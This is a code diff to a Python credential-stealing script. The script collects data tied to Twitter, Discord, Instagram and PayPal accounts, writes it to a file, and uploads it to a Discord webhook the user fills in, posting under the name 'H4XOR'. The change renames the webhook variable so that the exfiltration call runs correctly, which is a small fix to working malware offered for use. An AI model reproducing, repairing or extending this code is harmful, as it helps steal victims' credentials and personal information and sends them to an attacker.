@@ -25,7 +25,7 @@ import win32con
 from win32api import SetFileAttributes
 
 #your webhook (you can enter your webhook)
-webhook = ""
+webhook_link = ""
 #website selection (do not change for the good functioning of the system)
 website = ['twitter.com', 'discord.com', 'instagram.com']
 
@@ -227,7 +227,7 @@ def main():
                 f.write(f"Email (Paypal) {all_data_p[m][0]}\n-------------------------------\n")
                 discord_info_w(m, 2)
     #webhook sender (you can change : avatar_url and username)
-    webhook = DiscordWebhook(url=webhook, content=Personnal_info, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
+    webhook = DiscordWebhook(url=webhook_link, content=Personnal_info, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
     with open("Cooked_data.txt", "rb") as f:
         webhook.add_file(file=f.read(), filename='data.txt')
     webhook.execute()
